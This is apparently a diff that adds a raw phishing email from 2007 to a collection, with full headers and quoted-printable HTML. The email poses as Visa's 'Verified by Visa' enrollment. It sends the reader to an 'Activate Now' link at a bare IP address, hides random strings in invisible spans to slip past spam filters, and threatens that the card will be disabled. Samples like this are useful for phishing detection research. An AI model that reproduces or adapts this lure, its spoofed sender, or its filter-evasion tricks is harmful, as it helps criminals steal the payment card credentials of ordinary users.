@@ -1,0 +1,97 @@
+Return-Path: <Visa@visa.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+	by example.com (Postfix) with ESMTP id 16F14468E4
+	for <user@login.example.com>; Thu, 15 Feb 2007 06:46:17 -0500 (EST)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+	by mail.example.org (Postfix) with ESMTP id 1C5FD131FD51
+	for <user@example.com>; Thu, 15 Feb 2007 06:46:17 -0500 (EST)
+Received: from mail.brainstorminternet.net (mail.brainstorminternet.net [66.118.220.25])
+	by mail.example.org (Postfix) with ESMTP id 2462D6FA1C1
+	for <user@example.com>; Thu, 15 Feb 2007 06:46:17 -0500 (EST)
+Received: from web1.brainstorminternet.net (web1.brainstorminternet.net [66.118.201.150])
+	by mail.brainstorminternet.net (Postfix) with ESMTP id 2EA642B58C
+	for <user@example.com>; Thu, 15 Feb 2007 04:46:13 -0700 (MST)
+Received: from visa.com (localhost.brainstorminternet.net [127.0.0.1])
+	by web1.brainstorminternet.net (Postfix) with ESMTP id F1CE110F810
+	for <user@example.com>; Thu, 15 Feb 2007 04:41:31 -0700 (MST)
+From: Visa@visa.com
+To: user@example.com
+Subject: Verified by Visa enrollment
+Date: 15 Feb 2007 04:28:07 -0700
+Message-ID: <20070215042806.912841B3E4D94621@visa.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 829
+
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN">
+<html>
+<head>
+<style type=3D"text/css"><!--
+body,p,td,div,li,ul,input { font-family:Arial, Helvetica, sans-serif;font-si=
+ze:12px;color:#666;}
+--></style>
+</head>
+<table cellpadding=3D"5" cellspacing=3D"0" border=3D"0" width=3D"100%">
+<tr>
+<td align=3D"center">
+<table cellpadding=3D"5" cellspacing=3D"0" border=3D"0" width=3D"60%">
+<tr><td><img src=3D"http://usa.visa.com/images/vro/page/bankofamerica_vbv/bo=
+fa_verified_logo.gif" border=3D"0" alt=3D"Verified by Visa"></td>
+<td></tr>
+</table>
+</tr>
+<tr>
+<td bgcolor=3D"#0C2DA3" style=3D"height: 10px;"><img src=3D"http://www.visa.=
+com/globalgateway/images/spacer.gif" border=3D"0" height=3D"9" alt=3D""></td=
+>
+</tr>
+<tr>
+<td align=3D"center"><table cellpadding=3D"10" cellspacing=3D"0" border=3D"0=
+" width=3D"60%">
+<tr>
+<td>
+<font size=3D"5">Dear Visa Cardholder</font>,<br><div style=3D"display:none;=
+ color:white;">ZeLk23g0r11hNhw-z3Pb8bvWpyI6 -ZoBJzA</div><br>
+<b>Your card has been automatically enrolled in the Verified by Visa Program=
+!</b><p>
+To ensure your Visa card's security, it is important that you protect your V=
+isa card online with a personal password. Please take a moment, and activate=
+ for Verified by Visa now.<p>
+Verified by Visa protects your existing Visa card with a password you create=
+, giving you assurance that only you can use your Visa card online.<p>
+Simply activate your card and create your personal password. You=92ll get th=
+e added confidence that your Visa card is safe when you shop at participatin=
+g online stores.<p>
+
+<table align=3D"center" bgcolor=3D"#FFAB00" border=3D"0" cellpadding=3D"1" c=
+ellspacing=3D"0" width=3D"100%"><tr><td><table align=3D"center" bgcolor=3D"#=
+FFF4E3" border=3D"0" cellpadding=3D"4" cellspacing=3D"0" width=3D"100%"><tr>=
+<td align=3D"center"><a target=3D"_blank" href=3D"http://194.50.50.18/src/en=
+roll/" style=3D"text-decoration:none;"><b style=3D"text-decoration:none;colo=
+r:#666">Activate Now for Verified by Visa</b></a></td></tr></table></td></tr=
+></table>
+<P>
+Thank you for your support.<span style=3D"display:none; color: white;">jmgjq=
+gdngestbtisprtagxzfzsvomg</span><br>
+Visa Service Department
+<br><br>* Please note: If you FAIL to update your Visa card, it will be temp=
+orarily disabled.=20
+
+</td>
+</tr>
+</table>=20
+</td>
+</tr>
+</table>
+<body>
+</body>
+</html>
+
+
